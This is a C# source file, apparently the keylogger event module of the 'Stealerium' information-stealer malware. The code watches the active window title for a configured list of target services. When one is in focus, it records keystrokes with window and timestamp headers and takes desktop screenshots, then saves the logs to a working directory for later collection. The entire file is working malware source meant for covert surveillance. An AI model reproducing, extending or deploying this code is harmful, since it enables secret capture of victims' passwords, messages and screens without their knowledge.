using System;
using System.IO;
using System.Linq;
using Stealerium.Helpers;
using Stealerium.Target.System;

namespace Stealerium.Modules.Keylogger;

internal sealed class EventManager
{
	private static readonly string KeyloggerDirectory = Path.Combine(Paths.InitWorkDir(), "logs\\keylogger\\" + DateTime.Now.ToString("yyyy-MM-dd"));

	public static void Action()
	{
		if (Detect())
		{
			if (!string.IsNullOrWhiteSpace(Keylogger.KeyLogs))
			{
				Keylogger.KeyLogs += "\n\n";
			}
			Keylogger.KeyLogs = Keylogger.KeyLogs + "### " + WindowManager.ActiveWindow + " ### (" + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt") + ")\n";
			DesktopScreenshot.Make(KeyloggerDirectory);
			Keylogger.KeyloggerEnabled = true;
		}
		else
		{
			SendKeyLogs();
			Keylogger.KeyloggerEnabled = false;
		}
	}

	private static bool Detect()
	{
		return Config.KeyloggerServices.Any((string text) => WindowManager.ActiveWindow.ToLower().Contains(text));
	}

	private static void SendKeyLogs()
	{
		if (Keylogger.KeyLogs.Length >= 45 && !string.IsNullOrWhiteSpace(Keylogger.KeyLogs))
		{
			string path = KeyloggerDirectory + "\\" + DateTime.Now.ToString("hh.mm.ss") + ".txt";
			if (!Directory.Exists(KeyloggerDirectory))
			{
				Directory.CreateDirectory(KeyloggerDirectory);
			}
			File.WriteAllText(path, Keylogger.KeyLogs);
			Keylogger.KeyLogs = "";
		}
	}
}
